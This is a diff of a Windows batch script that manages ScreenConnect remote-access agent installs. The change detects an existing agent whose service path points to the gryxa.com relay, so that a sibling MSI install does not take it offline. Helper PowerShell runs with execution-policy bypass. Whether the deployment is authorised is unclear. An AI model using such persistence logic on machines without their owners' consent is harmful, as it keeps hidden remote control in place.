@@ -35,7 +35,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M35"
+set "MONVER=M36"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -235,10 +235,19 @@ if /I "!REGSTATE!"=="yes" (
 )
 rem O37: refuse sevrz /i when gryxa already present — shared legacy UpgradeCodes
 rem {0C94448B}/{1F85D7FE} make sibling msiexec /i knock Gryxa OFFLINE in panel.
+rem M36: detect Gryxa by relay domain too (any running gryxa.com SC), not only by FP.
 set "GREG=unknown"
 if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
 sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
 if not errorlevel 1 set "GREG=yes"
+rem any ScreenConnect service whose ImagePath is gryxa.com counts as Gryxa present
+for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
+  set "_FP=%%a"
+  set "_FP=!_FP: =!"
+  for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
+    echo %%I | findstr /I "gryxa.com" >nul && set "GREG=yes"
+  )
+)
 if /I "!GREG!"=="yes" (
   echo primary_skip_i_protect_gryxa>>"%LOG%"
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "protect-gryxa-skip-primary-i" >nul 2>&1
